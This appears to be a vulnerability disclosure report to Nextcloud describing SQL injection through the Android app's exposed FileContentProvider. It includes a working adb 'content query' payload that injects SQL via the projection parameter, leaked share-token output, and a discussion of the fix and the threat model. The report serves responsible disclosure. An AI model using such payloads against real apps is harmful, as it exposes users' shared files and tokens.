title: SQLi allow query restriction bypass on exposed FileContentProvider

profile.name: Nextcloud
profile.about: Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise.

vulnerability_information:
FileContentProvider is an exposed provider 

As per its definition on https://github.com/nextcloud/android/blob/master/src/main/java/com/owncloud/android/providers/FileContentProvider.java, limited set of data shall be exposed as per
```
 @l444
        switch (mUriMatcher.match(uri)) {
            case ROOT_DIRECTORY:
            case SINGLE_FILE:
            case DIRECTORY:
                break;

            default:
                if (isCallerNotAllowed(uri)) {
                    return null;
                }
}
```
However, the projection map restriction is only applied to ROOT_DIRECTORY @l577
```
 if (mUriMatcher.match(uri) == ROOT_DIRECTORY && projectionArray != null) {
```
because of this, it is possible to bypass the restrictions at @l444 by crafting for instance the  intent

```
 content query --uri content://org.nextcloud/file --projection "* from ocshares --"                                              

```

which results in 

```                                                                        
Row: 0 _id=1, file_source=71580, item_source=71580, share_type=3, shate_with=, path=/Nextcloud.mp4, permissions=1, shared_date=1544792454, expiration_date=0, token=rkNCkcYcbGEBDQN, shared_with_display_name=, is_directory=0, user_id=-1, id_remote_shared=9, owner_share=julien_contacts@cloud.local.yourosoft.com, is_password_protected=0, note=, hide_download=0
```

as per disclosed data on owner_share and token, one can easily forge the query https://cloud.local.yourosoft.com/index.php/s/rkNCkcYcbGEBDQN

any table defined in filelist.db is subject to full disclosure

## Impact

any table defined in filelist.db is subject to full disclosure

activities.message:
Just an update: 

the file does not need to be downloaded / made available offline / shared from device.
As soon as media is shared on server side, its metadata gets synced when the file is listed on the mobile device on server file list sync.

I forgot if I checked it or not but data integrity is also impacted as the owner can give edit capability.

Note that if password protection  is activated, this information is not added to ocshares and thus the data is not impacted

activities.message:
Hi Tobi.

This will indeed fix this specific issue.

However, the security on this `query()` strongly relies on isCallerNotAllowed, which is "weak" as  blacklist based .
Any time a URI would be added to the provider,  the mUriMatcher.match check will need to be upgraded too.

Why not constraining the projection map for all calls or at worst constraining projectionMap unless package is `callingPackage`?

activities.message:
Thank you fort testing!

> Why not constraining the projection map for all calls or at worst constraining projectionMap unless package is callingPackage?

We also thought about this, but this requires a bit more refactoring, as e.g. the document provider (for accessing storage with other apps) will use internally OCFile, which is filled via /files, but if we restrict this, it will fail.
We have this on our roadmap and as soon there is a change, I can post/link it here, if you want.

activities.message:
As discussed,

I really believe that having app installed on the phone capable of spying on NC storage is not synonym of "phone is compromised"

Besides, threat model state
>  Android apps on the device
> We do consider attacks involving other Android apps on the device as low or medium risk. Stored files can be hidden from other apps if appropriate storage option is selected inside the app. This should be secure, however, if the phone is compromised we don't guarantee data safety.

here, we do are at least on attacks involving other Android apps on the device, aren't we?
